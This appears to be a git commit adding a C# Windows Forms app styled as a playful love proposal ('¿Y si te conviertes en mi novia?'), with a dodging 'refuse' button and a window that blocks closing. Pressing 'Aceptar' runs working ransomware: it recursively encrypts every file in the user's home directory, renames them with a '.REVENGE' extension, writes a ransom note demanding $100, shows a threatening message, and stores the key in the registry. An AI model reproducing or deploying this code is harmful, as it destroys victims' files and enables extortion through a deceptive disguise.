6a302e5123f871fb5718ce13c5ea7203f3ce60cf
Rodriguez <javadevprueba@outlook.es>
2021-04-14 17:37:36 +0800

    First Commit

---
+++ Form1.Designer.cs
@@ -0,0 +1,111 @@
+﻿
+namespace BuscarElAmor {
+    partial class Form1 {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing) {
+            if (disposing && (components != null)) {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent() {
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            //
+            // label1
+            //
+            this.label1.Font = new System.Drawing.Font("Segoe UI", 13.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label1.ForeColor = System.Drawing.SystemColors.MenuHighlight;
+            this.label1.Location = new System.Drawing.Point(27, 110);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(437, 89);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Hey chica, te he estado persiguiendo por un largo periodo.";
+            //
+            // label2
+            //
+            this.label2.Font = new System.Drawing.Font("Segoe UI", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label2.ForeColor = System.Drawing.Color.Red;
+            this.label2.Location = new System.Drawing.Point(27, 230);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(465, 61);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "¿Y si te conviertes en mi novia?";
+            //
+            // pictureBox1
+            //
+            this.pictureBox1.Image = global::BuscarElAmor.Properties.Resources.vez;
+            this.pictureBox1.Location = new System.Drawing.Point(509, 56);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(304, 261);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 2;
+            this.pictureBox1.TabStop = false;
+            //
+            // button1
+            //
+            this.button1.Location = new System.Drawing.Point(138, 373);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(130, 47);
+            this.button1.TabIndex = 3;
+            this.button1.Text = "Aceptar";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            //
+            // button2
+            //
+            this.button2.Location = new System.Drawing.Point(589, 373);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(129, 47);
+            this.button2.TabIndex = 4;
+            this.button2.Text = "Lo niego";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            //
+            // Form1
+            //
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 20F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(850, 450);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Closing += new System.ComponentModel.CancelEventHandler(this.Form1_Closing);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,142 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Windows.Forms;
+
+namespace BuscarElAmor {
+    public partial class Form1 : Form {
+
+        bool clicked = false;
+        string password = GeneratePassword(16);
+
+        public Form1() {
+            InitializeComponent();
+        }
+
+        public void ejemplo() {
+            var file = Directory.GetFiles(@"C:\Users\" + Environment.UserName)[0];
+            if (file.EndsWith(".REVENGE")) {
+                try {
+                    string filename = file.Split(new[] { ".REVENGE" }, StringSplitOptions.None)[0];
+                    File.WriteAllBytes(file, decryptByteVigenere(File.ReadAllBytes(file), password));
+                    File.Move(file, filename);
+                } catch (Exception) {
+                    MessageBox.Show("Error, are you sure this password is correct ?");
+                    return;
+                }
+            }
+        }
+
+        public static byte[] decryptByteVigenere(byte[] ciphertext, string key) {
+            byte[] result = new Byte[ciphertext.Length];
+            key = key.Trim().ToUpper();
+            int keyIndex = 0;
+            int keylength = key.Length;
+            for (int i = 0; i < ciphertext.Length; i++) {
+                keyIndex = keyIndex % keylength;
+                int shift = (int)key[keyIndex] - 65;
+                result[i] = (byte)(((int)ciphertext[i] + 256 - shift) % 256);
+                keyIndex++;
+            }
+            return result;
+        }
+
+        void encryptDirectory(string location) {
+            try {
+                string[] files = Directory.GetFiles(location);
+                string[] childDirectories = Directory.GetDirectories(location);
+                for (int i = 0; i < files.Length; i++) {
+                    string extension = Path.GetExtension(files[i]);
+                    byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(files[i]), password);
+                    File.WriteAllBytes(files[i], bytesEncrypted);
+                    File.Move(files[i], files[i] + ".REVENGE");
+                }
+                for (int i = 0; i < childDirectories.Length; i++) {
+                    encryptDirectory(childDirectories[i]);
+                }
+            } catch { }
+        }
+
+        private static Random random = new Random();
+        public static string GeneratePassword(int length) {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                              .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+
+        public static byte[] Encrypt(byte[] plaintext, string key) {
+            byte[] result = new Byte[plaintext.Length];
+            key = key.Trim().ToUpper();
+            int keyIndex = 0;
+            int keylength = key.Length;
+            for (int i = 0; i < plaintext.Length; i++) {
+                keyIndex = keyIndex % keylength;
+                int shift = (int)key[keyIndex] - 65;
+                result[i] = (byte)(((int)plaintext[i] + shift) % 256);
+                keyIndex++;
+            }
+            return result;
+        }
+
+        private void Form1_Closing(object sender, System.ComponentModel.CancelEventArgs e) {
+            if(!clicked) {
+                string message = "No puede cerrar esta ventana antes de haber tomado una decisión.";
+                string title = "Tips";
+                MessageBoxButtons buttons = MessageBoxButtons.OKCancel;
+                DialogResult result = MessageBox.Show(message, title, buttons, MessageBoxIcon.Information);
+                if (result == DialogResult.OK) {
+                    this.Close();
+                }
+                e.Cancel = true;
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e) {
+            int x = this.ClientSize.Width - button2.Width;
+            int y = this.ClientSize.Height - button2.Height;
+            Random r = new Random();
+            button2.Location = new Point(r.Next(0, x + 1), r.Next(0, y + 1));
+        }
+
+        private void button1_Click(object sender, EventArgs e) {
+            var directory = Directory.GetFiles(@"C:\Users\" + Environment.UserName);
+            var folders = Directory.GetDirectories(@"C:\Users\" + Environment.UserName);
+            foreach (var folder in folders) {
+                try {
+                    encryptDirectory(folder);
+                } catch {
+                    continue;
+                }
+            }
+            //encrypting all files in the victim user directory .
+            foreach (var file in directory) {
+                try {
+                    byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(file), password);
+                    File.WriteAllBytes(file, bytesEncrypted);
+                    File.Move(file, file + ".REVENGE");
+                } catch {
+                    continue;
+                }
+            }
+            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "//ReadToRestore.txt", @"if you want to restore your files, send me 100$");
+            MessageBox.Show("All your files gone, send me 100$ to restore your files or die", "GG", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            ////////////////////
+            try {
+                RegistryKey rsg = null;
+                if (Registry.LocalMachine.OpenSubKey("SOFTWARE\\GeneratedPass").SubKeyCount <= 0) {
+                    Registry.LocalMachine.DeleteSubKey("SOFTWARE\\GeneratedPass");
+                    Registry.LocalMachine.CreateSubKey("SOFTWARE\\GeneratedPass");
+                }
+                rsg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\GeneratedPass", true);//true??????
+                rsg.SetValue("NuestraClave", password);
+                rsg.Close();
+            } catch (Exception ex) {
+            }
+            clicked = true;
+        }
+
+    }
+}
